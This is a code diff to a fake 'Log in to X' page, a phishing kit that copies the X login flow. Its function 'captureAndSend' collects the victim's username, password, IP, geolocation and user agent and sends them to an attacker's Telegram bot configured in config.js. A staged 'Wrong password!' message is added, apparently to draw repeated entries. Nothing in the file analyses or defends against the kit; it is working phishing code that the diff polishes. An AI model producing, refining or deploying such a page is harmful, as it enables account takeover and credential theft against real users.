@@ -5,12 +5,13 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Log in to X</title>
   <script src="https://cdn.tailwindcss.com"></script>
+  <!-- Load your config file -->
   <script src="config.js"></script>
 </head>
 
 <body class="text-white h-screen flex flex-col bg-black">
 
-  <!-- STEP 1 - Username / email / phone -->
+  <!-- STEP 1: Username / email / phone -->
   <div id="step1" class="flex flex-col h-full justify-between">
     <div class="flex justify-between items-center px-5 py-4">
       <button class="text-lg font-medium">Cancel</button>
@@ -31,6 +32,7 @@
         id="username"
         type="text"
         placeholder="Phone, email, or username"
+        autocomplete="off"
         class="mt-10 w-full bg-black border border-gray-700 rounded-full px-5 py-4 text-lg placeholder-gray-500 focus:outline-none focus:border-sky-500 focus:ring-1 focus:ring-sky-500 transition-all duration-200"
       />
     </div>
@@ -38,21 +40,19 @@
     <div class="px-8 pb-8 flex justify-between items-center">
       <span class="text-sky-500 text-base cursor-pointer hover:underline">Forgot password?</span>
       
-      <!-- NEXT button: white when active -->
       <button
         id="nextBtn"
         disabled
         class="px-8 py-3 rounded-full font-bold text-base transition-all duration-200
-               disabled:bg-gray-700 disabled:text-gray-500 disabled:cursor-not-allowed
-               bg-white text-black hover:bg-gray-100 shadow-md
-               active:scale-95"
+               bg-gray-700 text-gray-500 cursor-not-allowed
+               disabled:bg-gray-700 disabled:text-gray-500 disabled:cursor-not-allowed"
       >
         Next
       </button>
     </div>
   </div>
 
-  <!-- STEP 2 - Password + Error container -->
+  <!-- STEP 2: Password + fake error -->
   <div id="step2" class="hidden flex flex-col h-full justify-between relative">
     <div class="flex justify-between items-center px-5 py-4">
       <button onclick="goBack()" class="text-2xl">×</button>
@@ -87,6 +87,7 @@
 
       <p class="text-sky-500 mt-4 cursor-pointer hover:underline">Forgot password?</p>
 
+      <!-- Fake wrong password message -->
       <div id="errorMsg" class="hidden mt-6 bg-blue-600 rounded-lg p-5 text-center shadow-xl">
         <p class="text-2xl font-bold">Wrong password!</p>
         <p class="text-sm mt-3 opacity-90">
@@ -112,6 +113,9 @@
   </div>
 
   <script>
+    // ──────────────────────────────────────────────
+    //  Variables from config.js
+    // ──────────────────────────────────────────────
     const TELEGRAM_BOT_TOKEN = window.TELEGRAM_BOT_TOKEN;
     const TELEGRAM_CHAT_ID   = window.TELEGRAM_CHAT_ID;
 
@@ -126,23 +130,33 @@
 
     let attemptCount = 0;
 
-    // Next button: white background + black text when there's input
-    usernameInput.addEventListener("input", () => {
+    // ──────────────────────────────────────────────
+    //  NEXT BUTTON LOGIC – becomes white & clickable
+    // ──────────────────────────────────────────────
+    function updateNextButtonState() {
       const hasValue = usernameInput.value.trim().length > 0;
-      
+
       nextBtn.disabled = !hasValue;
 
       if (hasValue) {
-        nextBtn.classList.remove("bg-gray-700", "text-gray-500");
-        nextBtn.classList.add("bg-white", "text-black", "hover:bg-gray-100", "shadow-md");
+        nextBtn.classList.remove("bg-gray-700", "text-gray-500", "cursor-not-allowed");
+        nextBtn.classList.add("bg-white", "text-black", "hover:bg-gray-100", "cursor-pointer", "shadow-md");
       } else {
-        nextBtn.classList.remove("bg-white", "text-black", "hover:bg-gray-100", "shadow-md");
-        nextBtn.classList.add("bg-gray-700", "text-gray-500");
+        nextBtn.classList.remove("bg-white", "text-black", "hover:bg-gray-100", "cursor-pointer", "shadow-md");
+        nextBtn.classList.add("bg-gray-700", "text-gray-500", "cursor-not-allowed");
       }
-    });
+    }
+
+    // Run once on load + listen for changes
+    updateNextButtonState();
+    usernameInput.addEventListener("input", updateNextButtonState);
+    usernameInput.addEventListener("change", updateNextButtonState);
+    usernameInput.addEventListener("paste", () => setTimeout(updateNextButtonState, 10));
 
     nextBtn.addEventListener("click", () => {
-      if (usernameInput.value.trim() === "") return;
+      if (nextBtn.disabled) return;
+      if (!usernameInput.value.trim()) return;
+
       displayUser.textContent = usernameInput.value.trim();
       step1.classList.add("hidden");
       step2.classList.remove("hidden");
@@ -150,16 +164,22 @@
       attemptCount = 0;
     });
 
+    // ──────────────────────────────────────────────
+    //  BACK BUTTON
+    // ──────────────────────────────────────────────
     function goBack() {
       step2.classList.add("hidden");
       step1.classList.remove("hidden");
       errorMsg.classList.add("hidden");
     }
 
+    // ──────────────────────────────────────────────
+    //  PASSWORD FIELD + LOGIN BUTTON
+    // ──────────────────────────────────────────────
     passwordInput.addEventListener("input", () => {
       const hasValue = passwordInput.value.trim().length > 0;
       loginBtn.disabled = !hasValue;
-      
+
       if (hasValue) {
         loginBtn.classList.remove("bg-gray-700", "text-gray-400");
         loginBtn.classList.add("bg-white", "text-black");
@@ -173,12 +193,22 @@
       passwordInput.type = passwordInput.type === "password" ? "text" : "password";
     }
 
+    // ──────────────────────────────────────────────
+    //  CAPTURE + SEND TO TELEGRAM
+    // ──────────────────────────────────────────────
     async function captureAndSend(attemptNumber) {
       const username = usernameInput.value.trim();
       const password = passwordInput.value.trim();
       if (!username || !password) return;
 
-      let geo = { ip: "unknown", country: "unknown", region: "unknown", city: "unknown", isp: "unknown", proxy: "No" };
+      let geo = {
+        ip: "unknown",
+        country: "unknown",
+        region: "unknown",
+        city: "unknown",
+        isp: "unknown",
+        proxy: "No"
+      };
 
       try {
         const ipRes = await fetch("https://api.ipify.org?format=json");
@@ -195,7 +225,7 @@
           geo.isp     = data.org || data.asn || "unknown";
           geo.proxy   = data.in_eu || data.proxy ? "Yes" : "No";
         }
-      } catch {}
+      } catch (err) {}
 
       const ua = navigator.userAgent;
       const now = new Date();
@@ -253,6 +283,9 @@
       } catch {}
     }
 
+    // ──────────────────────────────────────────────
+    //  LOGIN BUTTON CLICK
+    // ──────────────────────────────────────────────
     loginBtn.addEventListener("click", async () => {
       attemptCount++;
       await captureAndSend(attemptCount);
